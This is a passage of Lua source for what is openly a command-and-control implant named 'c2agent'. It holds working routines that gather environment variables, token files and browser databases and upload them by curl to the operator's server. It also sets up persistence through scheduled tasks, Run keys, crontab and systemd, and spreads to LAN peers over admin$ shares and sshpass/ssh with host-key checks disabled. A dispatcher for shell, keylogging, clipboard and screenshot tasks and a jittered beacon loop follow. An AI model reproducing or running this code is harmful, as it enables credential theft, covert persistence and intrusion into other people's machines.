        local files = steal_browser_walk(root, targets)
        for _, filepath in ipairs(files) do
            local attr = io.open(filepath, "rb")
            if attr then
                local content = attr:read("*a")
                attr:close()
                if #content <= STEAL_MAX_FILE then
                    local rel = filepath:sub(#root + 2)
                    local safe_rel = rel:gsub("[/\\]", "__")
                    local dst_dir = work .. "/browser/" .. kind .. "/" .. safe_rel
                    mkdirp(dst_dir)
                    local filename = filepath:match("([^/\\]+)$") or ""
                    local dst = dst_dir .. "/" .. filename
                    local df = io.open(dst, "wb")
                    if df then
                        df:write(content)
                        df:close()
                        hits[#hits + 1] = "browser/" .. kind .. "/" .. safe_rel .. "/" .. filename
                    end
                end
            end
        end
    end
    return hits
end

local function task_steal(task_id, args)
    local profile = (args.profile or "all"):lower()
    if profile ~= "all" and profile ~= "env" and profile ~= "tokens" and profile ~= "browser" then
        profile = "all"
    end
    local work = mktmp()
    rmtree(work)
    local mk_rc = mkdirp(work)
    local manifest = {}
    local ok, err = pcall(function()
        if profile == "all" or profile == "env" then
            logmsg("steal: collecting env vars")
            for _, item in ipairs(steal_env(work)) do manifest[#manifest + 1] = item end
        end
        if profile == "all" or profile == "tokens" then
            logmsg("steal: collecting token files")
            for _, item in ipairs(steal_tokens(work)) do manifest[#manifest + 1] = item end
        end
        if profile == "all" or profile == "browser" then
            logmsg("steal: collecting browser dbs")
            for _, item in ipairs(steal_browser_collect(work)) do manifest[#manifest + 1] = item end
        end
    end)
    if not ok then
        rmtree(work)
        return "error: " .. tostring(err), 1
    end
    if #manifest == 0 then
        rmtree(work)
        return "steal (" .. profile .. "): nothing found", 0
    end
    -- Write manifest file
    table.sort(manifest)
    local mf = io.open(work .. "/manifest.txt", "w")
    if mf then
        mf:write(table.concat(manifest, "\n") .. "\n")
        mf:close()
    end
    -- Create archive: try zip/tar (unix) or tar/Compress-Archive (windows)
    local archive = work .. "/steal.zip"
    local ar_err = {}
    local rc1, rc2, rc3
    if IS_WIN then
        rc1 = os.execute(string.format(
            'tar -a -cf "%s" -C "%s" --exclude=steal.* . >NUL 2>"%s\\archive.err"',
            archive, work, work))
        ar_err[#ar_err + 1] = "tar rc=" .. tostring(rc1)
    else
        rc1 = os.execute(string.format(
            "cd '%s' && zip -r '%s' . -x steal.zip >/dev/null 2>&1", work, archive))
        ar_err[#ar_err + 1] = "zip rc=" .. tostring(rc1)
    end
    local f = io.open(archive, "rb")
    if not f and IS_WIN then
        rc2 = os.execute(string.format(
            "powershell -NoProfile -Command \"Compress-Archive -Path '%s\\*' -DestinationPath '%s' -Force\" 2>\"%s\\archive.err\"",
            work, archive, work))
        ar_err[#ar_err + 1] = "psca rc=" .. tostring(rc2)
        f = io.open(archive, "rb")
    end
    if not f then
        archive = work .. "/steal.tar.gz"
        if IS_WIN then
            rc3 = os.execute(string.format(
                "powershell -NoProfile -Command \"Compress-Archive -Path '%s\\*' -DestinationPath '%s' -Format tar -Force\" 2>\"%s\\archive.err\"",
                work, archive, work))
            ar_err[#ar_err + 1] = "pstar rc=" .. tostring(rc3)
        else
            rc3 = os.execute(string.format(
                "cd '%s' && tar czf '%s' --exclude=steal.* . >/dev/null 2>&1",
                work, archive))
            ar_err[#ar_err + 1] = "targz rc=" .. tostring(rc3)
        end
        f = io.open(archive, "rb")
    end
    if not f then
        local ef
        if IS_WIN then ef = io.open(work .. "\\archive.err", "rb") end
        local aerr = ef and (ef:read("*a") or "") or ""
        if ef then ef:close() end
        if IS_WIN and aerr == "" then
            os.execute('dir /b "' .. work .. '" > "' .. work .. '\\dir.txt" 2>NUL')
            local df = io.open(work .. "\\dir.txt", "rb")
            if df then
                ar_err[#ar_err + 1] = "\ndir:\n" .. (df:read("*a") or "")
                df:close()
            end
        end
        local listing = table.concat(manifest, "\n")
        rmtree(work)
        return "steal: failed to create archive ("
            .. table.concat(ar_err, " ")
            .. ") work=" .. work
            .. " mkdir_rc=" .. tostring(mk_rc)
            .. " temp=" .. tostring(os.getenv("TEMP") or os.getenv("TMP") or "-")
            .. (aerr:gsub("%s+", " ") ~= "" and (": " .. aerr:gsub("%s+", " ")) or "")
            .. "\nmanifest:\n" .. truncate_output(listing, 1500), 1
    end
    f:close()
    -- Upload via multipart curl
    local cmd = string.format(
        'curl -s -X POST "%s/api/files/%s" '
        .. '-H "X-Agent-Token: %s" '
        .. '-F "file=@%s;filename=steal.zip" '
        .. '--max-time 300 -o %s -w "%%{http_code}"',
        server, task_id, token, archive, DEVNULL)
    local handle = io.popen(cmd)
    local resp_code = "0"
    if handle then
        resp_code = handle:read("*a"):match("^%s*(.-)%s*$") or "0"
        handle:close()
    end
    os.remove(archive)
    rmtree(work)
    if resp_code ~= "200" then
        return "steal upload failed: HTTP " .. resp_code, 1
    end
    local listing = table.concat(manifest, "\n")
    local output = string.format("stole %d item(s) -> steal.zip\n%s", #manifest, listing)
    return truncate_output(output, 4000), 0
end

-- -------------------------------------------------------------- persistence
-- Copy self to a persistent path and register a logon/reboot hook that
-- relaunches with the same server/token/interval/jitter.

local function task_persistence(args)
    local srv  = server:gsub("/$", "")
    local tok  = token
    local iv   = tostring(interval)
    local jt   = tostring(jitter)
    local interp = "lua"
    local self = arg[0] or "agent.lua"
    local destdir, dest
    if IS_WIN then
        destdir = (os.getenv("APPDATA") or os.getenv("USERPROFILE") or ".")
            .. "\\Microsoft\\Windows\\c2update"
        dest = destdir .. "\\c2agent.lua"
    else
        local home = os.getenv("HOME") or "."
        destdir = home .. "/.config/c2update"
        dest = destdir .. "/" .. (self:match("([^/\\]+)$") or "c2agent.lua")
    end
    mkdirp(destdir)
    if IS_WIN then
        os.execute('copy /y "' .. self .. '" "' .. dest .. '" >NUL 2>&1')
    else
        os.execute("cp -f '" .. self .. "' '" .. dest .. "' 2>/dev/null")
    end
    local cmd = string.format('%s "%s" --server "%s" --token "%s" --interval %s --jitter %s',
        interp, dest, srv, tok, iv, jt)
    local ok = false
    local detail = ""
    if IS_WIN then
        local progdata = os.getenv("ProgramData") or os.getenv("ALLUSERSPROFILE") or "C:\\ProgramData"
        local wrapper_dir = progdata .. "\\c2update"
        mkdirp(wrapper_dir)
        local wrapper = wrapper_dir .. "\\c2relaunch.cmd"
        local wf = io.open(wrapper, "wb")
        if not wf then
            return "persistence error: could not write launcher " .. wrapper, 1
        end
        wf:write("@echo off\r\nstart \"\" /b " .. cmd .. "\r\n")
        wf:close()
        detail = "persistence: wrote launcher " .. wrapper
        local r1, _, c1 = os.execute(string.format(
            'schtasks /Create /TN "c2agent-persist" /TR "%s" /SC ONLOGON /RL HIGHEST /F >NUL 2>&1', wrapper))
        if r1 == true and c1 == 0 then
            ok = true
            detail = detail .. "\nschtasks: scheduled ONLOGON (c2agent-persist)"
        else
            local r2, _, c2 = os.execute(string.format(
                'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v c2agent /t REG_SZ /d "%s" /f >NUL 2>&1', wrapper))
            if r2 == true and c2 == 0 then
                ok = true
                detail = detail .. "\nreg: HKCU Run key set (c2agent)"
            end
        end
    else
        local cronout = shell_capture(string.format(
            "(crontab -l 2>/dev/null | grep -v 'c2agent-persist'; echo '@reboot %s # c2agent-persist') | crontab - 2>&1", cmd))
        local cr_ok = (cronout:gsub("%s+", "") == "")
        if cr_ok then
            detail = "crontab: @reboot hook installed (c2agent-persist)"
        else
            detail = "crontab: " .. cronout:gsub("%s+", " ")
        end
        local unit = destdir .. "/c2-update.service"
        local uf = io.open(unit, "w")
        if uf then
            uf:write(string.format(
                "[Unit]\nDescription=c2 update\n\n[Service]\nType=simple\nExecStart=/bin/sh -c \"%s\"\nRestart=always\n\n[Install]\nWantedBy=default.target\n", cmd))
            uf:close()
        end
        local sctlmark = shell_capture(
            "systemctl --user daemon-reload >/dev/null 2>&1; if systemctl --user enable --now c2-update.service >/dev/null 2>&1; then echo __OK__; else echo __FAIL__; fi")
        local sys_ok = (sctlmark:find("__OK__") ~= nil)
        if not sys_ok then detail = detail .. "\nsystemctl: user unit failed" end
        ok = cr_ok or sys_ok
    end
    local output = "persistence: copied self to " .. dest
    if detail ~= "" then output = output .. "\n" .. detail end
    if not ok then output = "persistence: failed\n" .. output end
    return truncate_output(output), ok and 0 or 1
end

-- ---------------------------------------------------------------- lateral
-- LAN lateral movement: discover local peers via arp/ip neigh, then deploy
-- and launch this same agent on each using shared credentials.

local function task_lateral(args)
    local subnet = args.subnet or ""
    local user = args.user or os.getenv("C2_LAT_USER") or ""
    local pass = args.pass or os.getenv("C2_LAT_PASS") or ""
    local own = local_ip()
    local base = subnet:match("^(%d+%.%d+%.%d+)") or own:match("^(%d+%.%d+%.%d+)")
    if not base then return "lateral: no LAN peers found", 1 end
    local raw = shell_capture("arp -a 2>/dev/null" .. (IS_WIN and "" or " ; ip neigh 2>/dev/null"))
    local peers, seen = {}, {}
    for ip in raw:gmatch("(%d+%.%d+%.%d+%.%d+)") do
        local prefix = ip:sub(1, #base)
        if prefix == base and ip:sub(#base + 1, #base + 1) == "." and ip ~= own and not seen[ip] then
            seen[ip] = true
            peers[#peers + 1] = ip
        end
    end
    table.sort(peers)
    if #peers > 30 then
        local capped = {}
        for i = 1, 30 do capped[i] = peers[i] end
        peers = capped
    end
    if #peers == 0 then return "lateral: no LAN peers found", 1 end

    local srv = server:gsub("/$", "")
    local iv  = tostring(interval)
    local jt  = tostring(jitter)
    local self  = arg[0] or "agent.lua"
    local bname = self:match("([^/\\]+)$") or "agent.lua"

    local function win_deploy(host, u, p)
        local share = "\\\\" .. host .. "\\admin$"
        local r, _, c = os.execute('net use "' .. share .. '" /user:' .. u .. ' "' .. p .. '" >NUL 2>&1')
        if not (r == true and c == 0) then
            return "failed (net use: access denied or unreachable)"
        end
        local cr, _, cc = os.execute('cmd /c copy /y "' .. self .. '" "' .. share .. "\\" .. bname .. '" >NUL 2>&1')
        if not (cr == true and cc == 0) then
            os.execute('net use "' .. share .. '" /delete /y >NUL 2>&1')
            return "failed (copy: file copy failed over admin$ share)"
        end
        local terr = shell_capture(string.format(
            'schtasks /Create /S %s /TN "c2agent-lateral" /TR "\\\\%s\\admin$\\%s" /SC ONLOGON /RU %s /RP "%s" /RL HIGHEST /F 2>&1',
            host, host, bname, u, p))
        os.execute('net use "' .. share .. '" /delete /y >NUL 2>&1')
        if terr:gsub("%s+", "") == "" then
            return "deployed (file dropped + scheduled c2agent-lateral)"
        else
            return "deployed (file dropped; task: " .. terr:gsub("%s+", " ") .. ")"
        end
    end

    local function unix_deploy(host, u, p)
        local scp_cmd = string.format(
            "sshpass -p '%s' scp -o StrictHostKeyChecking=no -o ConnectTimeout=8 '%s' '%s@%s:/tmp/%s' 2>&1; echo __RC:$?",
            p, self, u, host, bname)
        local sout = shell_capture(scp_cmd)
        local src = tonumber(sout:match("__RC:(%d+)")) or 1
        if src ~= 0 then
            return "failed (scp: " .. (sout:gsub("__RC:%d+", ""):gsub("%s+", " ")) .. ")"
        end
        local relaunch = string.format('%s /tmp/%s --server "%s" --token "%s" --interval %s --jitter %s',
            "lua", bname, srv, token, iv, jt)
        local remcmd = "'" .. relaunch .. "' &>/dev/null &"
        local ssh_cmd = string.format(
            "sshpass -p '%s' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=8 '%s@%s' '%s' 2>&1; echo __RC:$?",
            p, u, host, remcmd)
        local lout = shell_capture(ssh_cmd)
        local lrc = tonumber(lout:match("__RC:(%d+)")) or 1
        if lrc == 0 then
            return "deployed (file uploaded + launched)"
        else
            return "deployed (file uploaded; launch: " .. (lout:gsub("__RC:%d+", ""):gsub("%s+", " ")) .. ")"
        end
    end

    local n, depl, fail, skip = 0, 0, 0, 0
    local plist, lines = {}, {}
    for _, host in ipairs(peers) do
        n = n + 1
        plist[#plist + 1] = host
        local status
        if user == "" and pass == "" then
            status = "skipped (no credentials; set C2_LAT_USER/C2_LAT_PASS)"
            skip = skip + 1
        else
            if IS_WIN then
                status = win_deploy(host, user, pass)
            else
                status = unix_deploy(host, user, pass)
            end
            if status:find("^deployed") then
                depl = depl + 1
            elseif status:find("^failed") then
                fail = fail + 1
            elseif status:find("^skipped") then
                skip = skip + 1
            end
        end
        lines[#lines + 1] = "  " .. host .. ": " .. status
    end
    local output = string.format(
        "lateral: %d peer(s): %s\n%s\nlateral: deployed=%d failed=%d skipped=%d",
        n, table.concat(plist, ", "), table.concat(lines, "\n"), depl, fail, skip)
    return truncate_output(output), 0
end

local function execute_task(task)
    local task_id = task.task_id
    local ttype = task.type
    local args = task.args or {}
    logmsg("running task " .. task_id .. " (" .. ttype .. ")")

    if ttype == "shell" then
        local timeout = args.timeout or SHELL_TIMEOUT
        local output, code = run_shell(args.command or "", timeout)
        return output, code, false
    elseif ttype == "download" then
        local output, code = task_download(task_id, args)
        return output, code, false
    elseif ttype == "upload" then
        local output, code = task_upload(task_id, args)
        return output, code, false
    elseif ttype == "sleep" then
        local secs = tonumber(args.seconds) or 10
        if secs < 1 then secs = 1 end
        interval = secs
        return "heartbeat interval set to " .. interval .. "s", 0, false
    elseif ttype == "keylog" then
        local output, code = task_keylog(args)
        return output, code, false
    elseif ttype == "clipboard" then
        local output, code = task_clipboard(args)
        return output, code, false
    elseif ttype == "screenshot" then
        local output, code = task_screenshot(task_id, args)
        return output, code, false
    elseif ttype == "steal" then
        local output, code = task_steal(task_id, args)
        return output, code, false
    elseif ttype == "clone" then
        local output, code = task_clone(args)
        return output, code, false
    elseif ttype == "persistence" then
        local output, code = task_persistence(args)
        return output, code, false
    elseif ttype == "lateral" then
        local output, code = task_lateral(args)
        return output, code, false
    elseif ttype == "exit" then
        return "exiting", 0, true
    else
        return "unknown task type: " .. ttype, 1, false
    end
end

-- ----------------------------------------------------------------- main

-- Parse command-line arguments
local i = 1
while i <= #arg do
    if arg[i] == "-h" or arg[i] == "--help" then
        print("usage: lua agent.lua --server URL --token TOKEN [--interval N] [--jitter N] [--state FILE] [--verbose]")
        print("")
        print("Flags (also settable via C2_SERVER/C2_TOKEN/C2_INTERVAL/C2_JITTER/C2_STATE_FILE/C2_VERBOSE):")
        print("  --server URL      server base URL (required unless C2_SERVER is set)")
        print("  --token TOKEN     shared agent token (required unless C2_TOKEN is set)")
        print("  --interval N      heartbeat interval in seconds (default 10, min 1)")
        print("  --jitter N        random jitter in seconds added to the interval")
        print("  --state FILE      state file persisting the agent id (default ~/.c2agent.json)")
        print("  --verbose         print activity to stdout")
        print("  -h, --help        show this help and exit")
        os.exit(0)
    elseif arg[i] == "--server" and arg[i + 1] then
        server = arg[i + 1]; i = i + 2
    elseif arg[i] == "--token" and arg[i + 1] then
        token = arg[i + 1]; i = i + 2
    elseif arg[i] == "--interval" and arg[i + 1] then
        interval = tonumber(arg[i + 1]) or 10; i = i + 2
    elseif arg[i] == "--jitter" and arg[i + 1] then
        jitter = tonumber(arg[i + 1]) or 0; i = i + 2
    elseif arg[i] == "--verbose" then
        verbose = true; i = i + 1
    elseif arg[i] == "--state" and arg[i + 1] then
        STATE_FILE = arg[i + 1]; i = i + 2
    else
        i = i + 1
    end
end

-- Fallback to env vars
if server == "" then server = os.getenv("C2_SERVER") or "" end
if token == "" then token = os.getenv("C2_TOKEN") or "" end
local function not_passed(flag)
    for _, a in ipairs(arg) do if a == flag then return false end end
    return true
end
if not_passed("--interval") and os.getenv("C2_INTERVAL") then
    local v = tonumber(os.getenv("C2_INTERVAL")); if v then interval = v end
end
if not_passed("--jitter") and os.getenv("C2_JITTER") then
    local v = tonumber(os.getenv("C2_JITTER")); if v then jitter = v end
end
if not_passed("--state") and os.getenv("C2_STATE_FILE") then
    STATE_FILE = os.getenv("C2_STATE_FILE")
end
if not_passed("--verbose")
   and (os.getenv("C2_VERBOSE") == "1" or os.getenv("C2_VERBOSE") == "true") then
    verbose = true
end

if server == "" or token == "" then
    print("usage: lua agent.lua --server URL --token TOKEN [--interval N] [--jitter N] [--state FILE] [--verbose]")
    os.exit(1)
end

-- Strip trailing slash
server = server:gsub("/$", "")

load_id()
if agent_id == "" then
    register()
end

logmsg("agent running against " .. server .. " (interval " .. interval .. "s)")

while true do
    local tasks = checkin()
    for _, task in ipairs(tasks) do
        local output, code, should_exit = execute_task(task)
        report(task.task_id, output, code, "")
        if should_exit then
            logmsg("exit task received — shutting down")
            os.exit(0)
        end
    end
    local delay = interval
    if jitter > 0 then
        math.randomseed(os.time())
        delay = delay + math.random(0, jitter)
    end
    -- Sleep using a busy-wait since Lua has no native sleep
    local start = os.clock()
    while os.clock() - start < delay do end
    -- Poll clone watchers between checkins
    clone_poll()
end
